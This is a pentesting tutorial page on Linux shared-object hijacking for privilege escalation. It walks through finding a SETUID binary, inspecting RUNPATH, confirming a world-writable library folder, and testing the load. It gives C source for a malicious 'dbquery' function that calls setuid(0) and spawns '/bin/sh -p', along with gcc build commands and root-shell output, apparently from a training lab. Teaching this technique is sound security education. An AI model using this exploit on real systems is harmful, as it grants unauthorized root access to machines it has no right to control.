---
title: Shared Object Hijacking
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - privilege
  - escalation
  - linux
---
# Shared Object Hijacking

**1.** Identifying the SETUID Binary

Identify a binary with a **SETUID binary** (owned by root and has the SUID bit set), which means it executes with root privileges.

**2.** Using ldd, we inspect the shared libraries required by the binary.

`Ldd` displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.

```shell-session
ldd NameOfBinary
```

Programs and binaries under development usually have custom libraries associated with them. 

If we  notice that something is loaded from a non-standard library and a non standard location, such as `/development/libshared.so`, this might indicate a potential vulnerability.

**3.** Checking the RUNPATH Configuration.

To determine how the binary finds shared libraries, we inspect it using `readelf`.

```shell-session
readelf -d NameOfBinary  | grep PATH
```

If the configuration allows the loading of libraries from a folder writable by us, we could place a malicious library in it,  which will take precedence over other folders because entries in this file are checked first. Since, in the output from the example, `/development` is specified in `RUNPATH`, any shared object in this directory will be preferred.

**4.** Checking Write Permissions

`/development` comes from the example:

```
ls -la /development/
```

The presence of `drwxrwxrwx` (777 permissions) confirms that any user can write to this directory.


**5.** Testing the Exploitability

To check whether the binary loads the shared object from /development, we place a dummy libshared.so in that directory.

```
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
./NameOfBinary
```

Output:

```
./NameOfBinary: symbol lookup error: ./NameOfBinary: undefined symbol: dbquery
```

The error message indicates that `payroll` expects a function called `dbquery`, which isn't present in our copied library. This confirms that we can control the library.

**6.** Crafting a Malicious Shared Object

Since the binary is searching for `dbquery`, we create a malicious shared object named src.c with this function.

```C
#include<stdio.h> 
#include<stdlib.h> 
#include<unistd.h>  

void dbquery() {
	printf("Malicious library loaded\n");     
	setuid(0);     
	system("/bin/sh -p"); 
}
```

The `dbquery` function:

1. Prints a message confirming the malicious library is loaded.
2. Calls `setuid(0)` to elevate privileges to root.
3. Spawns a root shell (`/bin/sh -p`).

**7.**  Compiling the Malicious Library

We compile it as a shared object using `gcc`.

```
 gcc src.c -fPIC -shared -o /development/libshared.so
```

Where: 
- `-fPIC`: Generates position-independent code.
- `-shared`: Produces a shared object.


**8.** Gaining a Root Shell

Executing the vulnerable `NameOfBinary` binary now loads our malicious library.

```
./NameOfBinary
```

Output:

```
***************Inlane Freight Employee Database***************  
Malicious library loaded 
# id 

uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```

Since `NameOfBinary` runs as root (due to the SETUID bit), our injected library executes with root privileges, providing a **root shell**.